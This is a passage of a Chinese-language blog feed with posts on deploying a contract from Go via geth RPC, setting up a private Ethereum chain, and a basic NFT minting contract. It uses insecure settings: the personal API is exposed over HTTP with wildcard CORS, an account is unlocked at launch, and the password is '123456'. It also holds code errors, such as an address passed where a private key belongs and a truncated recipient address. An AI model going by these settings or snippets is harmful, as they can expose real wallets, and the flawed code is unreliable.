class="string">`&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;personal_newAccount&quot;,&quot;params&quot;:[&quot;`</span> + newPassword + <span class="string">`&quot;],&quot;id&quot;:1&#125;`</span>)</span><br><span class="line">    resp, err := http.Post(rpcURL, <span class="string">&quot;application/json&quot;</span>, payload)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析创建新账户的响应</span></span><br><span class="line">    <span class="keyword">var</span> newAccountResp <span class="keyword">struct</span> &#123;</span><br><span class="line">        Result <span class="type">string</span> <span class="string">`json:&quot;result&quot;`</span></span><br><span class="line">        Error  *<span class="keyword">struct</span> &#123;</span><br><span class="line">            Message <span class="type">string</span> <span class="string">`json:&quot;message&quot;`</span></span><br><span class="line">        &#125; <span class="string">`json:&quot;error&quot;`</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> err := json.NewDecoder(resp.Body).Decode(&amp;newAccountResp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> newAccountResp.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;Failed to create new account: %s&quot;</span>, newAccountResp.Error.Message)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析新账户地址</span></span><br><span class="line">    newAccountAddress := common.HexToAddress(newAccountResp.Result)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;New account address: %s\n&quot;</span>, newAccountAddress.Hex())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接到本地的 Geth 节点</span></span><br><span class="line">    client, err := rpc.Dial(rpcURL)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> client.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前 gas 价格</span></span><br><span class="line">    <span class="keyword">var</span> gasPrice *big.Int</span><br><span class="line">    <span class="keyword">if</span> err := client.CallContext(context.Background(), &amp;gasPrice, <span class="string">&quot;eth_gasPrice&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部署智能合约</span></span><br><span class="line">    auth := bind.NewKeyedTransactor(newAccountAddress.Hex())</span><br><span class="line">    auth.Value = big.NewInt(<span class="number">0</span>)           <span class="comment">// 部署时发送的以太币数量</span></span><br><span class="line">    auth.GasLimit = <span class="type">uint64</span>(<span class="number">3000000</span>)      <span class="comment">// 指定 gas 限制</span></span><br><span class="line">    auth.GasPrice = gasPrice              <span class="comment">// 使用当前 gas 价格</span></span><br><span class="line">    input := <span class="string">&quot;0x&quot;</span> + <span class="string">&quot;6080604052348015600e575f80fd5b506101e48061001c5f395ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c80631003e2d21461004357806360fe47b11461005f5780636d4ce63c1461007b575b5f80fd5b61005d600480360381019061005891906100fb565b610099565b005b610079600480360381019061007491906100fb565b6100b3565b005b6100836100bc565b6040516100909190610135565b60405180910390f35b5f8054826100a7919061017b565b9050805f819055505050565b805f8190555050565b5f8054905090565b5f80fd5b5f819050919050565b6100da816100c8565b81146100e4575f80fd5b50565b5f813590506100f5816100d1565b92915050565b5f602082840312156101105761010f6100c4565b5b5f61011d848285016100e7565b91505092915050565b61012f816100c8565b82525050565b5f6020820190506101485f830184610126565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610185826100c8565b9150610190836100c8565b92508282019050808211156101a8576101a761014e565b5b9291505056fea26469706673582212209645cec1c57b3e0ea64b23d942988cdc634242f2c015ac31b32aa6ddac78ade164736f6c63430008190033&quot;</span></span><br><span class="line">    address, tx, _, err := bind.DeployContract(auth, abi.JSON(contractABI), common.FromHex(input), client)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Contract address: %s\n&quot;</span>, address.Hex())</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待智能合约部署完成</span></span><br><span class="line">    _, err = bind.WaitDeployed(context.Background(), client, tx)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// // 输出新创建的账户地址和私钥</span></span><br><span class="line">    <span class="comment">// fmt.Printf(&quot;New account address: %s\n&quot;, newAccountAddress.Hex())</span></span><br><span class="line">    <span class="comment">// fmt.Printf(&quot;Private key: %x\n&quot;, crypto.FromECDSA(privateKey))</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="调用智能合约">调用智能合约</span></h2><h3><span id="安装-abigen-工具">安装 abigen 工具</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go get -u github.com/ethereum/go-ethereum</span><br></pre></td></tr></table></figure>

<h3><span id="生成合约绑定代码">生成合约绑定代码</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">abigen --sol SimpleStorage.sol --pkg main --out SimpleStorage.go</span><br></pre></td></tr></table></figure>

<h3><span id="在-main-函数中添加智能合约绑定和调用智能合约">在 main 函数中添加智能合约绑定和调用智能合约</span></h3><p>NewSimpleStorage 不是一个标准函数，而是在使用 abigen 时创建的一个函数，用于创建智能合约的绑定对象</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建智能合约绑定</span></span><br><span class="line">contract, err := NewSimpleStorage(address, client)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用智能合约的 get 函数</span></span><br><span class="line">result, err := contract.Get(<span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;Result of get function: %s\n&quot;</span>, result.String())</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>搭建以太坊私链</title>
    <url>/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/</url>
    <content><![CDATA[<p>这里的命令以 Linux 系统为准，但是在 Windows 系统下也是基本相同的</p>
<span id="more"></span>

<h2><span id="配置go环境">配置Go环境</span></h2><p>1、首先切换到管理员身份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>

<p>2、下载官⽅的 go 语⾔编译器压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.21.3.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>3、解压缩刚下载的新版本并放置到合适的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -C /usr/local -xzf go1.21.3.linux-amd64.tar.gz</span><br><span class="line">（如果有旧版本，先输入 `rm -rf /usr/local/go` 移除）</span><br></pre></td></tr></table></figure>

<p>4、设定环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure>
<p>试试看是否正常（应该会看到版本号）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go version</span><br></pre></td></tr></table></figure>

<h2><span id="构建geth">构建geth</span></h2><p>1、下载git</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>

<p>2、克隆以太坊源码<br>这一步很可能连不上github，没什么解决方法，多试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ethereum/go-ethereum.git</span><br></pre></td></tr></table></figure>

<p>3、进入ethereum所在文件夹<br>24-04-09更新: 现在直接克隆以太坊仓库下载的 geth 版本是 1.14.0-unstable，所以在运行链的时候就会出现以下报错，应该要先切换到 1.13版本</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/use_fatal.png" class>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd go-ethereum</span><br><span class="line">git checkout release/1.13</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>4、编译geth</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make geth</span><br></pre></td></tr></table></figure>
<p>如果发现下载很慢，可以终止掉，设置代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
<p>下载完成，应该可以看到以下画面</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90.png" class>

<p>5、进⼊⽬录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd build/bin</span><br></pre></td></tr></table></figure>

<p>6、启动主程序，连接主⽹并同步</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./geth</span><br></pre></td></tr></table></figure>

<p>7、配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nano ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>在该文件最后添加以下语句，要注意替换成自己主机的geth所在路径 (前面的~也要修改)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:~/Desktop/go-ethereum/build/bin</span><br></pre></td></tr></table></figure>
<p>退出后输入以下语句让更改生效，并检测是否配置成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source ~/.bashrc</span><br><span class="line">geth version</span><br></pre></td></tr></table></figure>

<h2><span id="搭建私链">搭建私链</span></h2><p>1、创造配置文件<br>在不同于以太坊源码的文件路径下创一个文件夹和.json文件，命名为genesis.json，可以在桌面创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注意要记得切换到管理员模式，才能创建文件夹</span><br><span class="line">sudo -s</span><br><span class="line">mkdir ./project</span><br><span class="line">mkdir ./project/MyChain</span><br><span class="line">vim ./project/MyChain/genesis.json</span><br><span class="line">// 修改完输入:wq退出vim</span><br></pre></td></tr></table></figure>
<p>在这个 json 文件下，配置这个私链的参数<br>这里使用的共识机制是 <a href="https://geth.ethereum.org/docs/tools/clef/clique-signing">Clique</a>，</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;chainId&quot;</span><span class="punctuation">:</span> <span class="number">12345</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;homesteadBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip150Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip155Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eip158Block&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;byzantiumBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constantinopleBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;petersburgBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;istanbulBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;berlinBlock&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clique&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;period&quot;</span><span class="punctuation">:</span> <span class="number">5</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;epoch&quot;</span><span class="punctuation">:</span> <span class="number">30000</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;difficulty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;gasLimit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;extradata&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000890fb1799fe7fa4b8e01ccf343e088d946fcd5560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;alloc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="string">&quot;300000&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;14c6ead33b265da463eef7367798ade6aa8e9d12&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;balance&quot;</span><span class="punctuation">:</span> <span class="string">&quot;400000&quot;</span> <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2、初始化链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ init ./project/MyChain/genesis.json</span><br></pre></td></tr></table></figure>
<p>成功后会出现以下提示 (可能会有 Error 信息，可以忽略)</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/init.png" class>

<p>假如出现以下报错，可以删除 .&#x2F;project&#x2F;MyChain&#x2F; 目录下新生成的两个文件夹，只保留 .json 文件</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/init_fatal.png" class>


<p>3、启用链<br>此处启用私链，并且开启RPC接口</p>
<p>24-04-09 更新: 在实验的时候发现，在较新版本的 geth 中，rpc 相关的指令已经不用 –rpcxxx，改为 –http.xxx</p>
<ul>
<li>http：开启 RPC 接口</li>
<li>http.port：指定端口</li>
<li>http.api：开启的RPC API</li>
<li>http.corsdomain：跨域请求，”*”为允许所有来源的跨域请求<br>而且，db 接口也已经被弃用，<br>所以，该命令将变为</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ --identity &quot;MyETH&quot; --http --http.port 8545  --http.api &quot;eth,net,web3,personal&quot; --http.corsdomain &quot;*&quot; --networkid 12345 console</span><br></pre></td></tr></table></figure>
<p>成功后将出现以下页面</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/success.png" class>

<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ --identity &quot;MyETH&quot; --rpc --rpcport 8545  --rpcapi &quot;db,eth,net,web3,personal&quot; --rpccorsdomain &quot;*&quot; --networkid 15 console</span><br></pre></td></tr></table></figure>

<ul>
<li>identity “MyETH”：节点身份标识</li>
<li>rpc：开启 RPC 接口</li>
<li>rpcport：指定端口</li>
<li>rpcapi：开启的RPC API</li>
<li>rpccorsdomain：跨域请求，”*”为允许所有来源的跨域请求</li>
<li>networkid：网络标识符，用于连上私链，networkid是在genesis.json中确定的<br>console：打开geth控制台，用于创建节点和部署智能合约</li>
</ul>
<h2><span id="创建用户并挖矿">创建用户并挖矿</span></h2><p>1、在控制台中创建用户</p>
<p>24-04-09 更新: 实验中发现 personal 已经被弃用，geth 控制台似乎也没有其他方法新创建账户。官方给出的解决方案是使用和 geth 解耦的 <a href="https://geth.ethereum.org/docs/tools/clef/introduction">clef</a> 创建账号<br>个人认为，通过另开一个终端，使用以下命令创建账户会更方便</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth account new --datadir ./project/MyChain/</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">personal.newAccount(&quot;123456&quot;)//括号内是自定义的密码，返回“0x......”为创建出来的用户的地址。之后要用到。</span><br><span class="line">eth.accounts //查询用户</span><br><span class="line">eth.getBalance(eth.accounts[0]) // 通过eth.accounts[0]查询账户余额。若私链上有多个用户，第一个用户为eth.accounts[0]，第二个为eth.accounts[1]。以此类推。</span><br><span class="line">eth.getBalance(&quot;0x......账户地址&quot;) // 通过地址查询出账户余额</span><br></pre></td></tr></table></figure>

<p>2、开始挖矿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eth.coinbase // 第一种查看矿工的账户地址的方式，该地址默认为第一个账户地址</span><br><span class="line">web3.eth.coinbase // 第二种查看方式矿工地址的方式</span><br><span class="line">miner.setEtherbase(eth.accounts[0]) </span><br><span class="line">//设置矿工用户</span><br></pre></td></tr></table></figure>

<p>3、停止挖矿<br>挖一段时间后，账户就有钱了，可以部署智能合约（部署智能合约需要花钱），可以停止挖矿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">miner.stop()</span><br><span class="line">eth.getBalance(eth.accounts[0])</span><br><span class="line">//再查账户，发现自己突然有钱了。</span><br></pre></td></tr></table></figure>
<hr>
<p>24-04-15 更新: miner.start() 必须先解锁账户，而 personal.unlockAccount 在较新版本的 geth 已经被弃用，不进行挖矿会导致所有交易都不能上链，包括智能合约的部署</p>
<p>目前的解决方法是，修改私链启动语句，将所有和 HTTP-RPC 相关的参数都删去 (不能与 –unlock 并存)，并添加 –unlock 参数，在启动链的时候就解锁账户，之后的步骤和之前相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/MyChain/ --unlock 0x890fb1799fe7fa4b8e01ccf343e088d946fcd556 console</span><br></pre></td></tr></table></figure>

<p>但是这样会产生新的问题，即无法远程调用 geth 提供的 HTTP-RPC API。目前想到的曲线救国方法是，一部分节点只用于挖矿 (以下称<em>挖矿节点</em>)，一部分节点用于提供 HTTP-RPC API (以下称<em>链接节点</em>)，但还未测试过，不知是否可行。</p>
<hr>
<p>24-04-15 更新: 这种方法似乎是可行的，但是不一定符合工业标准，具体做法是：<br>1、创建新目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir ./project/node2</span><br></pre></td></tr></table></figure>

<p>2、用原来的 genesis.json 初始化链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/node2 init ./project/MyChain/genesis.json</span><br></pre></td></tr></table></figure>
<p>并把 .&#x2F;project&#x2F;MyChain&#x2F;keystore 复制到 .&#x2F;project&#x2F;node2&#x2F;keystore</p>
<p>3、启用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">geth --datadir ./project/node2 --http --http.port 8545 --http.corsdomain &quot;*&quot; --networkid 12345 --port 30305 --authrpc.port 8552 --ipcpath \\.\pipe\geth2.ipc</span><br></pre></td></tr></table></figure>

<p>4、添加节点<br>复制链接节点的enode值，并在挖矿节点所在链控制台中输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.addPeer(&quot;enode://94d8388d7e97a8be1ee6005cc2bd81ad2b9f3e6580bec8a1305cac6271c5319b6a7e8273dfc82b0dab9c4c11ab71433f29ca30df3a4e327527a570ef1ed4bc28@127.0.0.1:30305&quot;)</span><br></pre></td></tr></table></figure>
<p>成功后会出现以下界面，可以看到两次 Looking for peers 的 peercount 值发生了改变</p>
<img data-src="/2024/03/26/%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE/peercount_change.png" class>

<p>5、使用 node.js 远程创建交易<br>以下是一个简单的转账交易例子，在任意位置创建文件 tx.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Web3</span> = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>).<span class="property">default</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> <span class="title class_">Web3</span>(<span class="string">&#x27;http://localhost:8545&#x27;</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> privateKey = <span class="string">&#x27;替换成您的私钥&#x27;</span>; <span class="comment">// 私钥，确保正确和安全地处理</span></span><br><span class="line">    <span class="keyword">var</span> tx = &#123;</span><br><span class="line">        <span class="attr">from</span>: <span class="string">&quot;0x890fb1799fe7fa4b8e01ccf343e088d946fcd556&quot;</span>,</span><br><span class="line">        <span class="attr">to</span>: <span class="string">&quot;0x4c6ead33b265da463eef7367798ade6aa8e9d12&quot;</span>,</span><br><span class="line">        <span class="attr">value</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="number">1</span>, <span class="string">&quot;ether&quot;</span>), <span class="comment">// 转账金额，单位为以太</span></span><br><span class="line">        <span class="attr">gas</span>: <span class="number">21000</span>, <span class="comment">// 交易的 gas 限额</span></span><br><span class="line">        <span class="attr">gasPrice</span>: web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="number">10</span>, <span class="string">&quot;gwei&quot;</span>) <span class="comment">// gas 价格，单位为 wei</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 签名交易</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> signedTx = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="property">accounts</span>.<span class="title function_">signTransaction</span>(tx, privateKey);</span><br><span class="line">        <span class="keyword">const</span> receipt = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendSignedTransaction</span>(signedTx.<span class="property">rawTransaction</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;交易收据:&#x27;</span>, receipt);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;签名或发送交易出错:&#x27;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>在挖矿节点所在链用 miner.start() 等待交易提交上链 (这里作者不确定是否需要在链接节点所在链用 miner.start()，正常来说会因为没有解锁账户而失败，但是似乎要这样做才能使两个节点同步)<br>创建好交易后，就可以使用以下命令提交交易</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node tx.js</span><br></pre></td></tr></table></figure>
<p>然后同时在两条链都查询账户余额，发现数额相同，说明两条节点成功同步</p>
<h2><span id="部署智能合约">部署智能合约</span></h2><p>参照下一篇文章</p>
<a href="/2024/03/30/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E9%93%BE%E9%83%A8%E7%BD%B2%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" title="以太坊私链部署智能合约">以太坊私链部署智能合约</a>

<!-- 在admin里面可以看到监听的端口号

personal.newAccount() 创建新用户
输入密码，返回值是账户地址

personal.unlockAccount(eth.accounts[0]) 
之后就可以输入密码，解锁账号

miner.start 开始挖矿

geth --datadir ../project/MyChain/ --networkid 15 console 2>output.log
2代表输出，>是重定向

geth --datadir ../project/MyChain/ --networkid 15 --rpc console 2>output.log

可以用开发者模式 -dev -->

]]></content>
      <categories>
        <category>科研</category>
      </categories>
  </entry>
  <entry>
    <title>简单的NFT铸造智能合约</title>
    <url>/2024/04/17/%E7%AE%80%E5%8D%95%E7%9A%84NFT%E9%93%B8%E9%80%A0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<h3><span id="代码">代码</span></h3><p>以下将展示一个简单的 NFT 铸造智能合约 (忽略交易相关的函数)</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0;</span><br><span class="line"></span><br><span class="line">// ERC 165 标准接口</span><br><span class="line">interface IERC165 &#123;&#125;</span><br><span class="line"></span><br><span class="line">// ERC 721 标准接口</span><br><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    function balanceOf(address owner) external view returns (uint balance);</span><br><span class="line"></span><br><span class="line">    function ownerOfTokenId(uint tokenId) external view returns (address owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC721 is IERC721 &#123;</span><br><span class="line">    </span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    // Mapping from token ID to owner address</span><br><span class="line">    mapping(uint =&gt; address) private _owners;</span><br><span class="line"></span><br><span class="line">    // Mapping owner address to token count</span><br><span class="line">    mapping(address =&gt; uint) private _balances;</span><br><span class="line"></span><br><span class="line">    // Mapping from tokenId to picture URL</span><br><span class="line">    mapping(uint256 =&gt; string) private _tokenURLs;</span><br><span class="line"></span><br><span class="line">    // Mapping from URL to token ID</span><br><span class="line">    mapping(string =&gt; uint256) private _urlToTokenId;</span><br><span class="line"></span><br><span class="line">    // Mapping from address to array of owned token IDs</span><br><span class="line">    mapping(address =&gt; uint256[]) private _ownedTokens;</span><br><span class="line"></span><br><span class="line">    // Mapping from address to array of owned URLs</span><br><span class="line">    mapping(address =&gt; string[]) private _ownedURLs;</span><br><span class="line"></span><br><span class="line">    // Mapping from URL to transaction hash</span><br><span class="line">    mapping(string =&gt; bytes32) public tokenHashes;</span><br><span class="line"></span><br><span class="line">    // Array to store all token IDs</span><br><span class="line">    uint256[] private _allTokenIds;</span><br><span class="line"></span><br><span class="line">    // Mapping from token Id to index in _allTokenIds array</span><br><span class="line">    mapping(uint256 =&gt; uint256) private _allTokenIdsIndex;</span><br><span class="line">    </span><br><span class="line">    // Event triggered when setting token URL</span><br><span class="line">    event TokenURLSet(uint256 indexed tokenId, string url);</span><br><span class="line"></span><br><span class="line">    // Private function _mint to mint NFTs by address and tokenId</span><br><span class="line">    function _mint(address to, uint tokenId) private &#123;</span><br><span class="line">        require(to != address(0), &quot;mint to zero address&quot;);</span><br><span class="line">        require(_owners[tokenId] == address(0), &quot;token already minted&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[to] += 1;</span><br><span class="line">        _owners[tokenId] = to;</span><br><span class="line"></span><br><span class="line">        // Add tokenId to _allTokenIds array</span><br><span class="line">        _allTokenIds.push(tokenId);</span><br><span class="line">        _allTokenIdsIndex[tokenId] = _allTokenIds.length - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Internal function to set token URL</span><br><span class="line">    function _setTokenURL(uint256 tokenId, string memory tokenURI) internal &#123;</span><br><span class="line">        require(_exists(tokenId), &quot;URL set of nonexistent token&quot;);</span><br><span class="line">        _tokenURLs[tokenId] = tokenURI;</span><br><span class="line">        emit TokenURLSet(tokenId, tokenURI);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Function to mint NFTs by address and picture URL</span><br><span class="line">    function mint(address to, string memory tokenURI) public &#123;</span><br><span class="line">        bytes32 hash = keccak256(abi.encodePacked(tokenURI));</span><br><span class="line">        uint256 newTokenId = uint256(hash);</span><br><span class="line"></span><br><span class="line">        _mint(to, newTokenId);</span><br><span class="line"></span><br><span class="line">        _setTokenURL(newTokenId, tokenURI);</span><br><span class="line">        _urlToTokenId[tokenURI] = newTokenId;</span><br><span class="line">        _ownedTokens[to].push(newTokenId);</span><br><span class="line">        _ownedURLs[to].push(tokenURI);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Function to get token URL by tokenId</span><br><span class="line">    function getURLbyTokenId(uint256 tokenId) public view returns (string memory) &#123;</span><br><span class="line">        require(_exists(tokenId), &quot;URL query for nonexistent token&quot;);</span><br><span class="line">        return _tokenURLs[tokenId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to get tokenId by URL</span><br><span class="line">    function getTokenIdbyURL(string memory 